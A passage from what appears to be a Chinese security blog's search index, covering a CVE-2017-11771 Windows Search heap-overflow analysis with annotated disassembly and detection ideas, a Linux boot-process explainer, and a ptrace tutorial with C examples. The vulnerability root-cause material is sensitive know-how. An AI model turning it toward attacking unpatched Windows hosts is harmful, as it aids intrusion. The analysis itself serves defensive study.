[esi+20h] ; cbReserved .text:62A6912D mov edi, [esi+24h] ; cbReadBuffer [......] .text:62A6915F cmp eax, edi .text:62A69161 jb loc_62AA21B3 ; ensure cbReserved \u003c cbReadBuffer [......] .text:62A691DE push [ebp+cbReserved] ; cbReserved .text:62A691E1 lea ecx, [ebp+fixedVarBuffer] ; this .text:62A691E7 push ebx ; cbRowWidth .text:62A691E8 push edi ; cbReadBuffer .text:62A691E9 push [ebp+clientBase] ; clientBase .text:62A691EC push esi ; base of message .text:62A691ED call ??0CFixedVarBuff... ; CFixedVarBufferAllocator() # CFixedVarBufferAllocator::CFixedVarBufferAllocator(): .text:62A68413 mov ecx, [ebp+msgBase_arg0] .text:62A68416 push ebx .text:62A68417 mov dword ptr [eax+8], offset ??_7PFixedA... .text:62A6841E push esi .text:62A6841F mov esi, [ebp+cbReserved_arg10] .text:62A68422 mov [eax+14h], edx .text:62A68425 lea edx, [esi+ecx] ; resultDataStart .text:62A68428 mov [eax+18h], edx .text:62A6842B mov edx, [ebp+cbReadBuffer_arg8] .text:62A6842E xor ebx, ebx .text:62A68430 add edx, ecx ; resultDataEnd .text:62A68432 test ecx, ecx .text:62A68434 push edi .text:62A68435 mov edi, [ebp+cbRowWidth_argC] .text:62A68438 setnz bl .text:62A6843B mov [eax+20h], edi .text:62A6843E pop edi .text:62A6843F mov [eax+24h], esi .text:62A68442 pop esi .text:62A68443 mov dword ptr [eax], offset ??_7CFixedVar... .text:62A68449 mov dword ptr [eax+8], offset ??_7CFixedV... .text:62A68450 mov [eax+4], ebx .text:62A68453 mov [eax+0Ch], ecx .text:62A68456 mov [eax+10h], ecx .text:62A68459 mov [eax+1Ch], edx .text:62A6845C pop ebx .text:62A6845D test dl, 7 ; check if resultDataEnd is 8-byte aligned .text:62A68460 jnz loc_62AA20DA .text:62A68466 pop ebp ; fails to validate resultDataEnd \u003e= resultDataStart .text:62A68467 retn 14h [......] .text:62AA20DA dec dword ptr [eax+1Ch] ; subtract resultDataEnd .text:62AA20DD test byte ptr [eax+1Ch], 7 ; check alignment .text:62AA20E1 jz loc_62A68466 .text:62AA20E7 jmp short loc_62AA20DA # CFixedVarBufferAllocator::AllocFixed(): .text:62A745B0 mov edi, edi .text:62A745B2 push ebp .text:62A745B3 mov ebp, esp .text:62A745B5 mov eax, [ecx+10h] .text:62A745B8 mov edx, [ecx+18h] .text:62A745BB sub esp, 20h .text:62A745BE push esi .text:62A745BF mov esi, [ecx+14h] .text:62A745C2 sub esi, eax ; resultDataEnd - resultDataStart .text:62A745C4 cmp edx, esi ; compare above difference to cbRowWidth .text:62A745C6 ja loc_62AA20E9 .text:62A745CC add edx, eax ; add cbRowWidth to resultDataStart .text:62A745CE mov [ecx+10h], edx .text:62A745D1 pop esi .text:62A745D2 leave .text:62A745D3 retn ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"5. 攻击流量 SMB1: SMB2: ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"6. PoC分析 首先进行了前期的验证工作，例如创建命名管道，建立查询连接，判断文件夹是否处于共享访问。按照查询流程依次进行数据发送，来到GetRowsIn消息： ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:6","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞检测 暂无。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 检测思路 首先监控通过SMB建立MsFtewds命名管道的操作，然后使用byte_math检测出现漏洞的字段 2. 可能存在的风险 SMBandx命令有链式结构，可以嵌套，容易产生绕过。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Tech"],"content":"Linux开机引导和启动过程详解","date":"2020-10-19","objectID":"/2020/10/boot/","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"Linux开机引导和启动过程详解 ","date":"2020-10-19","objectID":"/2020/10/boot/:0:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"一、概述 操作系统的启动过程本质上分为2个阶段：boot（引导）阶段和startup（启动）阶段。引导阶段开始于打开电源剋管，结束于内核初始化完成和systemd进程成功运行；启动阶段接管了剩余的其他的工作，一直到OS进入可操作状态。其涵盖的内容可以用下图表示： 本文主要以GRUB和systemd为载体，尽可能详细地描述OS的引导和启动过程。 ","date":"2020-10-19","objectID":"/2020/10/boot/:1:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"二、引导过程 引导过程的初始化可以通过2种方式实现：关机状态下的电源开启，开机状态的OS重启。其过程主要有以下几个阶段： ","date":"2020-10-19","objectID":"/2020/10/boot/:2:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"1. 硬件启动流程 1. BIOS上电自检（POST） BIOS的第一步是上电自检，检查硬件的基本功能是否正常。如果POST失败，那么引导过程失败，电脑启动失败。POST检查成功后，产生一个BIOS中断 – INT 13H，该中断指向某个接入的可引导设备的引导扇区。它所找到的包含有效的引导记录的第一个引导扇区将被装在到内存0x7c00处，并且控制权也将从引导扇区转移到此段代码。也就是说，该中断指向的中断服务程序实际上就是磁盘服务程序，其主要用途就是将指定扇区的代码加载到内存的指定位置。 BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等，因此BIOS信息对于计算机来说十分重要。只有顺利通过BIOS自检，计算机才能继续后续流程，知道应该去读取哪个硬件设备。在BIOS将OS的控制权交给硬盘的第一个扇区后，就开始由Linux来控制系统了。 2. 读取MBR POST结束后，BIOS会在接入的磁盘中查找引导记录，其通常位于MBR，它加载它找到第一个引导记录到内存中，并开始执行代码。MBR是磁盘上第0磁道的第一个扇区 – Master Boot Record，大小为512字节，里面存放了预启动信息、分区表信息，总体可分为2部分：第一部分为引导（PRE-BOOT）区，大小为446字节，其内容为引导代码，这446字节的文件通常被叫做引导镜像(boot.img)；第二部分为分区表（PARTITION PABLE），大小为66字节，记录硬盘分区信息。（MBR的详细描述可见文章MBR详述） 系统找到BIOS指定的磁盘的MBR后，就将其复制到0x7c00地址所处的物理内存中。这里被复制的内容，就是boot loader，常见的有lilo，grub，grub2等。 由于这一阶段的引导代码的空间只有446字节，所以无法完成理解文件系统结构等功能，因此需要再找一个位于引导记录和设备第一个分区之间的位置来实现更多功能。而这个位置，就是boot loader所在位置。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:1","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"2. Boot Loader启动引导阶段 boot loader是在OS内核运行之前运行的一段小程序。通过这段小程序，可以初始化硬件设备、建立内存空间的映射图等，从而将系统的软硬件环境设置完备，为OS内核做好一切准备工作。 1. Stage 1 Stage1阶段所执行的代码为在执行系统安装时就预先写入到MBR的Boot Loader中的代码，其主要作用是将磁盘0磁道第2扇区的内容读入内存并执行，它是Stage 1.5阶段或Staget 2阶段的入口。 2. Stage 1.5 由于一些历史技术原因，在第一个分区的开始位置在扇区63和MBR之间遗留了62个512字节的扇区（总计31744字节）。该区域就可以用于存储完善功能的实现代码core.img，大小为25389字节。此时，该空间中可以容纳一些通用的文件系统驱动程序，如标准的ext，fat等。 Stage 1.5阶段是Stage 1阶段和Stage 2阶段的中间桥梁。Stage 1.5阶段具有识别启动分区文件系统的能力，此后GRUB程序便有能力去访问/boot分区下/grub目录下的Stage 2文件，并将Stage 2载入内存执行。 3. Stage 2 Stage 2阶段时，所有的文件都已存放在/boot/grub目录及其子目录下。Stage 2阶段执行时，首先会解析GRUB程序的配置文件grub.conf，并依配置文件决定是否显示系统启动菜单（列出可被加载执行的内核列表）。然后加载内核镜像到内存中，通过initrd程序建立Ramdisk内存虚拟根文件系统。此时控制权将转交给内核程序。 以上各个Stage中GURB和MBR的情况如下图： ","date":"2020-10-19","objectID":"/2020/10/boot/:2:2","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"3. 内核引导流程 内核引导阶段主要通过在内存中建立虚拟根文件系统实现相关设备的驱动并建立和切换到真正的根文件系统。内核文件均以一种自解压的压缩格式存储以节省空间，它与一个初始化的内存映像和存储设备映射表都存储于/boot目录下。 在选定的内核加载到内存中并开始执行后，在其进行任何工作之前，内核文件首先必须从压缩格式解压自身，此时屏幕一般会输出“Uncom pressing Linux”的提示，当解压缩完成后，输出“OK, booting the kernel”。 解压内核镜像加载到内存，以及initrd程序建立Ramdisk内存虚拟根文件系统后，内核开始驱动基本硬件，并调用虚拟根文件系统中的init程序加载驱动模块初始化系统中各种设备的相关配置工作，其中包括CPU、I/O、存储设备等。当所需的驱动程序加载完后，会根据grub.conf配置文件中“root=XXX”部分所指定的内容创建一个根设备，然后将根文件系统以只读的方式挂载，并切换到真正的根文件系统上，同时调用系统进程的老祖宗进程/sbin/init程序，进入系统初始化阶段。 这里涉及到一个关键函数：start_kernel()函数（后续将单独出一篇文章进行该函数的调试），它主要执行了以下操作： 在屏幕上打印出当前的内核版本信息。 执行setup_arch()，对系统结构进行设置。 执行sched_init()，对系统的调度机制进行初始化。先是对每个可用CPU上的runqueque进行初始化;然后初始化0号进程(其task struct和系统空M堆栈在startup_32()中己经被分配)为系统idle进程，即系统空闲时占据CPU的进程。 执行parse_early_param()和parsees_args()解析系统启动参数。 执行trap_in itQ，先设置了系统中断向量表。0－19号的陷阱门用于CPU异常处理;然后初始化系统调用向量;最后调用cpu_init()完善对CPU的初始化，用于支持进程调度机制，包括设定标志位寄存器、任务寄存器、初始化程序调试相关寄存器等等。 执行rcu_init()，初始化系统中的Read-Copy Update互斥机制。 执行init_IRQ()函数，初始化用于外设的中断，完成对IDT的最终初始化过程。 执行init_timers(), softirq_init()和time_init()函数，分别初始系统的定时器机制，软中断机制以及系统日期和时间。 执行mem_init()函数，初始化物理内存页面的page数据结构描述符，完成对物理内存管理机制的创建。 执行kmem_cache_init(),完成对通用slab缓冲区管理机制的初始化工作。 执行fork_init()，计算出当前系统的物理内存容量能够允许创建的进程(线程)数量。 执行proc_caches_init(), bufer_init(), unnamed_dev_init() ,vfs_caches_init(), signals_init()等函数对各种管理机制建立起专用的slab缓冲区队列。 执行proc_root_init()函数，对虚拟文件系统/proc进行初始化。 在start_kenrel()的结尾，内核通过kenrel_thread()创建出第一个系统内核线程(即1号进程)，该线程执行的是内核中的init()函数，负责的是下一阶段的启动任务。最后调用cpues_idle()函数:进入了系统主循环体口默认将一直执行default_idle()函数中的指令，即CPU的halt指令，直到就绪队列中存在其他进程需要被调度时才会转向执行其他函数。此时，系统中唯一存 在就绪状态的进程就是由kerne_hread()创建的init进程(内核线程)，所以内核并不进入default_idle()函数，而是转向init()函数继续启动过程。 完成以上过程后，Linux内核已可以正常运行。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:3","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"4. 系统初始化流程 该步骤主要完成通过/sbin/init,init程序准备软件运行坏境，启动系统服务 通过/etc/inittab文件确定运行级别，然后去执行系统初始化脚本/etc/rc.sysinit,为用户初始化用户空间环境，在完成初始化后，根据运行级别，系统开始对应级别的目录启动服务，关闭那些不要的服务（里面S99local -\u003e ../rc.local）用户自动服务启动脚本。 关键文件详解 1. 系统启动级别：/etc/inittab文件 # inittab is only used by upstart for the default runlevel. # # ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM. # # System initialization is started by /etc/init/rcS.conf # # Individual runlevels are started by /etc/init/rc.conf # # Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf # # Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf, # with configuration in /etc/sysconfig/init. # # For information on how to write upstart event handlers, or how # upstart works, see init(5), init(8), and initctl(8). # # Default runlevel. The runlevels used are: # 0 - halt (Do NOT set initdefault to this) 关机 # 1 - Single user mode 单用户模式，root用户，无需认证，维护模式； # 2 - Multiuser, without NFS (The same as 3, if you do not have networking)， 多用户模式，会启动网络功能，但是不会启动NFS，维护模式； # 3 - Full multiuser mode 完全功能模式，文本界面； # 4 - unused 预留 # 5 - X11 完全功能模式，图形界面，此处使用的图形界面为X11 # 6 - reboot (Do NOT set initdefault to this) 重启 # id:3:initdefault: 2. 系统初始化脚本：/etc/rc.d/rc.sysinit 该文件在各个不同的发布版本中存在不同，此处仅以centos作为样例进行解释。 /etc/rc.v/rc.sysinit主要的工作大概有以下几项： 获取网络环境和主机类型：读取网络设置文件/etc/sysconfig/network，获取主机名以及网关等网络环境； 测试与挂载内存设备/proc和USB设备/sys：除挂载内存设备外，还会主动检查系统上是否存在USB设备，如果有，则载入对应的驱动，并挂载USB的文件系统； 判断是否启动SELinux：SELinux，全称Security Enhance Linux套件，其主要作用是强化Linux操作环境的安全性； 周边设备的检查与PnP(Plug and Play）参数的测试：根据内核在开机时的检查结果（/proc/sys/kernel/modprobe）开始i 进行ide/scsi/network/audio等周边设备的检查，并利用已装在的kernel模块进行PnP设备的参数测试； 载入用户自定义模块：用户可以在/etc/sysconfig/modules/*.modules设置要加载的模块； 载入内核的相关设置：系统会主动读取/etc/sysctl.conf的内容，根据其配置设置内核各选项； 设置系统时间； 设置console样式； 设置RAID和LVM等功能； 使用fsck进行磁盘文件系统检查； 进行磁盘容量quota的转换（非必要）； 重新以可读模式挂载系统磁盘； 启动quota功能； 启动系统随机装置（产生随机数功能）； 清除开机过程中的缓存内容； 将开机过程中的相关信息写入到/var/log/dmesg文件中。 #!/bin/bash # # /etc/rc.d/rc.sysinit - run once at boot time # # Taken in part from Miquel van Smoorenburg's bcheckrc. # # 获取主机名 HOSTNAME=$(/bin/hostname) set -m # 如果存在/etc/sysconfig/network则执行 if [ -f /etc/sysconfig/network ]; then . /etc/sysconfig/network fi # 执行后HOSTNAME如果为空或“(none)”，则设置主机名为localhost if [ -z \"$HOSTNAME\" -o \"$HOSTNAME\" = \"(none)\" ]; then HOSTNAME=localhost fi # 挂在/proc和/sys，这样fsck才能使用卷标 if [ ! -e /proc/mounts ]; then mount -n -t proc /proc /proc # -n表示不写/etc/mtab，因为此时的/为只读 mount -n -t sysfs /sys /sys \u003e/dev/null 2\u003e\u00261 # 将/sys目录以sysfs格式挂载到/sys目录下 fi # 如果存在/prc/bus/usb目录，则挂载usbfs到usb下 if [ ! -d /proc/bus/usb ]; then modprobe usbcore \u003e/dev/null 2\u003e\u00261 \u0026\u0026 mount -n -t usbfs /proc/bus/usb /proc/bus/usb else mount -n -t usbfs /proc/bus/usb /proc/bus/usb fi # 挂载/etc/fstab文件中定义的所有文件系统 #remount /dev/shm to set attributes from fstab #669700 mount -n -o remount /dev/shm \u003e/dev/null 2\u003e\u00261 #remount /proc to set attributes from fstab #984003 mount -n -o remount /proc \u003e/dev/null 2\u003e\u00261 # 执行functions文件，该文件提供来很多有用的函数，具体内容可见参考文献5 . /etc/init.d/functions PLYMOUTH= [ -x /bin/plymouth ] \u0026\u0026 PLYMOUTH=yes # 在启动时显示一个动画 # 激活udev和selinux # 检查SELinux状态 SELINUX_STATE= if [ -e \"/selinux/enforce\" ] \u0026\u0026 [ \"$(cat /proc/self/attr/current)\" != \"kernel\" ]; then if [ -r \"/selinux/enforce\" ] ; then SELINUX_STATE=$(cat \"/selinux/enforce\") else # 如果无法成功读取，则直接置1 SELINUX_STATE=1 fi fi if [ -n \"$SELINUX_STATE\" -a -x /sbin/restorecon ] \u0026\u0026 __fgrep \" /dev \" /proc/mounts \u003e/dev/null 2\u003e\u00261 ; then /sbin/restorecon -R -F /dev 2\u003e/dev/null fi disable_selinux() { echo $\"*** Warning -- SELinux is active\" echo $\"*** Disabling security enforcement for system recovery.\" echo $\"*** Run 'setenforce 1' to reenable.\" echo \"0\" \u003e \"/selinux/enforce\" } relabel_selinux() { # if /sbin/init is not labeled correctly this process is running in the # wrong context, so a reboot will be required after relabel AUTORELABEL= . /etc/selinux/config echo \"0\" \u003e /selinux/enforce [ -n \"$PLYMOUTH\" ] \u0026\u0026 plymouth --hide-splash if [ \"$AUTORELABEL\" = \"0\" ]; then echo echo $\"*** Warning -- SELinux ${SELINUXTYPE}poli","date":"2020-10-19","objectID":"/2020/10/boot/:2:4","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"5. 启动终端，用户登录shell 这一步是用户登录shell过程 如果没有改变级别，默认情况执行/sbin/mingetty打开6个纯文本终端，让用户输入用户名和密码。输入完成后，再调用login程序，核对密码。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:5","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"参考链接 https://linux.cn/article-8807-1.html https://blog.51cto.com/zhang789/1851675 https://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html https://blog.51cto.com/433266/2173126 https://www.cnblogs.com/f-ck-need-u/p/7518142.html ","date":"2020-10-19","objectID":"/2020/10/boot/:3:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Vuln"],"content":"Linux ptrace 详解","date":"2020-10-18","objectID":"/2020/10/ptrace/","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"Linux ptrace 详解 备注：文章中使用的Linux内核源码版本为Linux 5.9，使用的Linux版本为Linux ubuntu 5.4.0-65-generic ","date":"2020-10-18","objectID":"/2020/10/ptrace/:0:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"一、简述 ptrace系统调用提供了一个进程(tracer)可以控制另一个进程(tracee)运行的方法，并且tracer可以监控和修改tracee的内存和寄存器，主要用作实现断点调试和系统调用跟踪。 tracee首先要被attach到tracer上，这里的attach以线程为对象，在多线程场景（这里的多线程场景指的使用clone CLONE_THREAD flag创建的线程组）下，每个线程可以分别被attach到tracer上。ptrace的命令总是以下面的调用格式发送到指定的tracee上： ptrace(PTRACE_foom, pid, ...) // pid为linux中对应的线程ID 一个进程可以通过调用fork()函数来初始化一个跟踪，并让生成的子进程执行PTRACE_TRACEME，然后执行execve(一般情况下)来启动跟踪。进程也可以使用PTRACE_ATTACH或PTRACE_SEIZE进行跟踪。 当处于被跟踪状态时，tracee每收到一个信号就会stop，即使是某些时候信号是被忽略的。tracer将在下一次调用waitpid或与wait相关的系统调用之一）时收到通知。该调用会返回一个状态值，包含tracee停止的原因。tracee发生stop时，tracer可以使用各种ptrace的request来检查和修改tracee。然后，tracer使tracee继续运行，选择性地忽略所传递的信号（甚至传递一个与原来不同的信号）。 当tracer结束跟踪后，发送PTRACE_DETACH信号释放tracee，tracee可以在常规状态下继续运行。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:1:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"二、函数原型及初步使用 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. 函数原型 ptrace的原型如下： long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 其中request参数表明执行的行为（后续将重点介绍）， pid参数标识目标进程，addr参数表明执行peek和poke操作的地址，data参数则对于poke操作，指明存放数据的地址，对于peek操作，指明获取数据的地址。 返回值，成功执行时，PTRACE_PEEK请求返回所请求的数据，其他情况时返回0，失败则返回-1。errno被设置为 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 函数定义 ptrace的内核实现在kernel/ptrace.c文件中，内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的。其他的是与架构相关的。 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); if (!child) { ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 系统调用都改为了SYSCALL_DEFINE的方式。如何获得上面的定义的呢？这里需要穿插一下SYSCALL_DEFINE的定义(syscall.h): #define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) #define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) #define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) #define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) #define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) #define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) 宏定义进行展开： #define SYSCALL_DEFINEx(x, sname, ...) \\ SYSCALL_METADATA(sname, x, __VA_ARGS__) \\ __SYSCALL_DEFINEx(x, sname, __VA_ARGS__) /* * The asmlinkage stub is aliased to a function named __se_sys_*() which * sign-extends 32-bit ints to longs whenever needed. The actual work is * done within __do_sys_*(). */ #ifndef __SYSCALL_DEFINEx #define __SYSCALL_DEFINEx(x, name, ...) \\ __diag_push(); \\ __diag_ignore(GCC, 8, \"-Wattribute-alias\", \\ \"Type aliasing is used to sanitize syscall arguments\");\\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ __attribute__((alias(__stringify(__se_sys##name)))); \\ ALLOW_ERROR_INJECTION(sys##name, ERRNO); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)); \\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)) \\ { \\ long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\\ __MAP(x,__SC_TEST,__VA_ARGS__); \\ __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__)); \\ return ret; \\ } \\ __diag_pop(); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) #endif /* __SYSCALL_DEFINEx */ __SYSCALL_DEFINEx中的x表示系统调用的参数个数，且sys_ptrace的宏定义如下： /* kernel/ptrace.c */ asmlinkage long sys_ptrace(long request, long pid, unsigned long addr, unsigned long data); 所以对应的__SYSCALL_DEFINEx应该是SYSCALL_DEFINE4，这与上面的定义SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)一致。 仔细观察上面的代码可以发现，函数定义其实在最后一行，结尾没有分号，然后再加上花括号即形成完整的函数定义。前面的几句代码并不是函数的实现（详细的分析可以跟踪源码，出于篇幅原因此处不放出每个宏定义的跟踪）。 定义的转换过程： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) --\u003e SYSCALL_DEFINEx(4, _ptrace, __VA_ARGS__) --\u003e __SYSCALL_DEFINEx(4, __ptrace, __VA_ARGS__) #define __SYSCALL_DEFINEx(x, name, ...) \\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ --\u003e asmlinkage long sys_ptrace(__MAP(4,__SC_DECL,__VA_ARGS__)) 而对__MAP宏和__SC_DECL宏的定义如下： /* * __MAP - apply a macro to syscall arguments * __MAP(n, m, t1, a1, t2, a2, ..., tn, an) will expand to * m(t1, a1), m(t2, a2), ..., m(tn, an) * The first argument must be equal to the amount of type/name * pairs given. Note that this list of pairs (i.e. the arguments * of __MAP starting at the third one) is in the same format as * for SYSCALL_DEFINE\u003cn\u003e/COMPAT_SYSCALL_DEFINE\u003cn\u003e */ #define __MAP0(m,...) #define __MAP1(m,t,a,...) m(t,a) #define __MAP2(m,t,a,","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 初步使用 1. 最简单的ls跟踪 首先通过一个简单的例子来熟悉一下ptrace的使用： #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003csys/ptrace.h\u003e#include \u003csys/wait.h\u003e#include \u003csys/reg.h\u003e#include \u003csys/types.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); // Tell kernel, trace me execl(\"/bin/ls\", \"ls\", NULL); }else{ /*Receive certification after child process stopped*/ wait(NULL); /*Read child process's rax*/ orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); printf(\"[+] The child made a system call %ld.\\n\", orig_rax); /*Continue*/ ptrace(PTRACE_CONT, child, NULL, NULL); } return 0; } 运行结果如下： 打印出系统调用号，并等待用户输入。查看/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件（64位系统）查看59对应的系统调用： 59号恰好为execve函数调用。对上面的过程进行简单总结： 父进程通过调用fork()来创建子进程，在子进程中，执行execl()之前，先运行ptrace()，request参数设置为PTRACE_TRACEME来告诉kernel当前进程正在被trace。当有信号量传递到该进程，进程会stop，提醒父进程在wait()调用处继续执行。然后调用execl()，执行成功后，新程序运行前，SIGTRAP信号量被发送到该进程，子进程停止，父进程在wait()调用处收到通知，获取子进程的控制权，查看子进程内存和寄存器相关信息。 当发生系统调用时，kernel保存了rax寄存器的原始内容，其中存放的是系统调用号，我们可以使用request参数为PTRACE_PEEKUSER的ptrace来从子进程的USER段读取出该值。 系统调用检查结束后，子进程通过调用request参数为PTRACE_CONT的ptrace函数继续执行。 2. 系统调用查看参数 #include \u003csys/ptrace.h\u003e#include \u003csys/types.h\u003e#include \u003csys/wait.h\u003e#include \u003cunistd.h\u003e#include \u003csys/user.h\u003e#include \u003csys/reg.h\u003e#include \u003cstdio.h\u003e#include \u003csys/syscall.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); execl(\"/bin/ls\", \"ls\", NULL); }else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall = 1; params[0] = ptrace(PTRACE_PEEKUSER, child, 8 * RBX, NULL); params[1] = ptrace(PTRACE_PEEKUSER, child, 8 * RCX, NULL); params[2] = ptrace(PTRACE_PEEKUSER, child, 8 * RDX, NULL); printf(\"Write called with %ld, %ld, %ld\\n\", params[0], params[1], params[2]); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8 * RAX, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 在上面的程序中，跟踪的是wirte的系统调用，ls命令总计进行了三次write的调用。request参数为PTEACE_SYSCALL时的ptrace使kernel在进行系统调用进入或退出时stop子进程，这等价于执行PTRACE_CONT并在下一次系统调用进入或退出时stop。 wait系统调用中的status变量用于检查子进程是否已退出，这是用来检查子进程是否被ptrace停掉或是否退出的典型方法。而宏WIFEXITED则表示了子进程是否正常结束（例如通过调用exit或者从main返回等），正常结束时返回true。 3. 系统调用参数-改进版 前面有介绍PTRACE_GETREGS参数，使用它来获取寄存器的值相比前面一种方法要简单很多： #include \u003cstdio.h\u003e#include \u003csys/reg.h\u003e#include \u003csys/user.h\u003e#include \u003csys/wait.h\u003e#include \u003csys/ptrace.h\u003e#include 